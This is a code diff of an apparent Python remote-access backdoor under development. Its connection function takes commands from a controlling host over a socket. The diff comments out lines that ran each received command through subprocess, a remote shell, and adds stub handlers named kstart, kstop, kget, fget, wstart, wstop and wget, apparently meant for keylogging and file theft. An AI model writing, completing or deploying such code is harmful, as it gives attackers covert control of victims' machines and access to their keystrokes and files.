@@ -61,17 +61,35 @@ def connection(ip):
             command = s.recv(2048)
             if not command:
                 break
+            command = command.decode()
+            command_type = command.split()[0]
+            if command_type == "kstart":
+                print("kstart")
+            elif command_type == "kstop":
+                print("kstop")
+            elif command_type == "kget":
+                print("kget")
+            elif command_type == "fget":
+                print("fget")
+            elif command_type == "wstart":
+                print("wstart")
+            elif command_type == "wstop":
+                print("wstop")
+            elif command_type == "wget":
+                print("wget")
+            else:
+                print(f"command {command_type} not found")
             print(f"Received {command}")
             # command = fernet.decrypt(command.decode()).decode()
             print(f"Decoded {command}")
             if command == "exit":
                 break
-            try:
-                data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                out, err = data.communicate()
-            except Exception:
-                out = ("psh: command not found: {}".format(command)).encode()
-            # s.sendall(fernet.encrypt(out))
+            # try:
+            #     data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            #     out, err = data.communicate()
+            # except Exception:
+            #     out = ("psh: command not found: {}".format(command)).encode()
+            # # s.sendall(fernet.encrypt(out))
 
 
 if __name__ == '__main__':
